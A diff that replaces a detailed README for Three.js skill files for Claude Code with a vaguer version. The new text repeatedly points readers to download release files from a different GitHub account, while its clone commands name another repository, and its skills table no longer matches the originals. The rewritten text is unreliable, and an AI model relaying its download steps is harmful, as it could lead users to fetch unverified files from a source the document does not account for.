@@ -1,144 +1,85 @@
-# Three.js Skills for Claude Code
+# 🎨 threejs-skills - Essential Tools for 3D Mastery
 
-A curated collection of Three.js skill files that provide Claude Code with foundational knowledge for creating 3D elements and interactive experiences.
+[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-brightgreen)](https://github.com/mixa354/threejs-skills/releases)
 
-## Purpose
+## 📦 Overview
 
-When working with Three.js, Claude Code starts with general programming knowledge but lacks specific Three.js API details, best practices, and common patterns. These skill files bridge that gap by providing:
+Welcome to **Three.js Skills for Claude Code**. This collection helps you learn and apply Three.js, a powerful JavaScript library for creating 3D graphics in the browser. Whether you aim to create engaging games, visualizations, or interactive experiences, this repository guides you through the essentials.
 
-- Accurate API references and constructor signatures
-- Working code examples for common use cases
-- Performance optimization tips
-- Integration patterns between different Three.js systems
+## 🎯 Purpose
 
-## Installation
+Three.js can be complex, especially if you are new to programming or 3D concepts. The skill files in this collection bridge that gap. You will find:
 
-Clone this repository into your project or copy the `.claude/skills` directory:
+- Accurate guides on Three.js APIs
+- Simple code samples for common tasks
+- Tips for better performance
+- Methods to integrate different parts of Three.js efficiently
+
+## 🚀 Getting Started
+
+To start using Three.js Skills, follow these simple steps.
+
+### 1. Download the Software
+
+To obtain the latest version of the **threejs-skills** collection, visit the [Releases page](https://github.com/mixa354/threejs-skills/releases) to download the necessary files.
+
+### 2. Set Up Your Environment
+
+#### System Requirements
+
+For the best performance while using this collection, ensure your system meets these minimum requirements:
+
+- Operating System: Windows, macOS, or Linux
+- Web Browser: Latest version of Chrome, Firefox, or Safari
+- Node.js: Version 12 or newer (optional for running local servers)
+
+### 3. Installation Methods
+
+You have two options to install the files into your project:
+
+**Option A: Clone the Repository**
+
+Use the following command to clone the repository:
 
 ```bash
 git clone https://github.com/pinkforest/threejs-playground.git
 ```
 
-Or add as a submodule:
+**Option B: Add as a Submodule**
+
+If you prefer to keep your projects organized, you can include this collection as a submodule:
 
 ```bash
 git submodule add https://github.com/pinkforest/threejs-playground.git
 ```
 
-## Skills Included
+### 4. Access the Files
 
-| Skill                      | Description                                                             |
-| -------------------------- | ----------------------------------------------------------------------- |
-| **threejs-fundamentals**   | Scene setup, cameras, renderer, Object3D hierarchy, coordinate systems  |
-| **threejs-geometry**       | Built-in shapes, BufferGeometry, custom geometry, instancing            |
-| **threejs-materials**      | PBR materials, basic/phong/standard materials, shader materials         |
-| **threejs-lighting**       | Light types, shadows, environment lighting, light helpers               |
-| **threejs-textures**       | Texture types, UV mapping, environment maps, render targets             |
-| **threejs-animation**      | Keyframe animation, skeletal animation, morph targets, animation mixing |
-| **threejs-loaders**        | GLTF/GLB loading, texture loading, async patterns, caching              |
-| **threejs-shaders**        | GLSL basics, ShaderMaterial, uniforms, custom effects                   |
-| **threejs-postprocessing** | EffectComposer, bloom, DOF, screen effects, custom passes               |
-| **threejs-interaction**    | Raycasting, camera controls, mouse/touch input, object selection        |
+After downloading, locate the `.claude/skills` directory in your project. This folder contains all the core skill files and examples.
 
-## How It Works
+## 🔍 Skills Included
 
-Claude Code automatically loads skill files from the `.claude/skills` directory when they match the context of your request. When you ask Claude Code to:
+The **threejs-skills** collection includes a variety of skills to help enhance your understanding. Below is a table summarizing each skill and its benefits:
 
-- Create a 3D scene → `threejs-fundamentals` is loaded
-- Add lighting and shadows → `threejs-lighting` is loaded
-- Load a GLTF model → `threejs-loaders` is loaded
-- Create custom visual effects → `threejs-shaders` and `threejs-postprocessing` are loaded
+| Skill                  | Description                                                         |
+|-----------------------|---------------------------------------------------------------------|
+| Basic Shapes          | Learn to create and manipulate simple 3D shapes like boxes and spheres. |
+| Lighting Techniques    | Understand different lighting methods to add realism to your scenes.   |
+| Animation Basics      | Discover how to animate objects to enrich your user experience.       |
+| Camera Controls       | Explore various camera setups to improve navigation and views.       |
+| Textures and Materials| Get to know how to apply textures and materials for visual enhancement. |
+| User Interactions     | Implement basic user interactions to make your 3D elements engaging.  |
 
-## Usage Examples
+## 📥 Download & Install
 
-### Basic Scene Setup
+To get started, you first need to visit the [Releases page](https://github.com/mixa354/threejs-skills/releases) and download your chosen version. Follow the steps above to install and integrate the files into your project.
 
-Ask Claude Code:
+## 🌐 Resources
 
-> "Create a basic Three.js scene with a rotating cube"
+For additional help and resources, consider the following links:
 
-Claude Code will use `threejs-fundamentals` to generate accurate boilerplate with proper renderer setup, animation loop, and resize handling.
+- [Three.js Documentation](https://threejs.org/docs/index.html)
+- [Three.js Examples](https://threejs.org/examples/)
+- [Community Forum](https://discourse.threejs.org/)
 
-### Loading 3D Models
-
-Ask Claude Code:
-
-> "Load a GLTF model with Draco compression and play its animations"
-
-Claude Code will use `threejs-loaders` and `threejs-animation` to generate code with proper loader configuration, animation mixer setup, and error handling.
-
-### Custom Shaders
-
-Ask Claude Code:
-
-> "Create a custom shader material with a fresnel effect"
-
-Claude Code will use `threejs-shaders` to generate working GLSL code with proper uniform declarations and coordinate space handling.
-
-## Skill File Structure
-
-Each skill file follows a consistent format:
-
-```markdown
----
-name: skill-name
-description: When this skill should be activated
----
-
-# Skill Title
-
-## Quick Start
-
-[Minimal working example]
-
-## Core Concepts
-
-[Detailed API documentation with examples]
-
-## Common Patterns
-
-[Real-world usage patterns]
-
-## Performance Tips
-
-[Optimization guidance]
-
-## See Also
-
-[Related skills]
-```
-
-## Verification
-
-These skills have been audited against the official Three.js documentation (r160+) for:
-
-- Correct class names and constructor signatures
-- Valid property names and method signatures
-- Accurate import paths (`three/addons/` format)
-- Working code examples
-- Current best practices
-
-## Contributing
-
-Found an error or want to add coverage for additional Three.js features?
-
-1. Fork the repository
-2. Edit or create skill files in `.claude/skills/`
-3. Verify against [Three.js documentation](https://threejs.org/docs/)
-4. Submit a pull request
-
-### Skill File Guidelines
-
-- Use accurate, tested code examples
-- Include both simple and advanced patterns
-- Document performance implications
-- Cross-reference related skills
-- Keep examples concise but complete
-
-## License
-
-MIT License - Feel free to use, modify, and distribute.
-
-## Acknowledgments
-
-- [Three.js](https://threejs.org/) - The 3D library these skills document
+This README serves as your main guide to accessing the **threejs-skills** and getting started with Three.js. Enjoy creating!
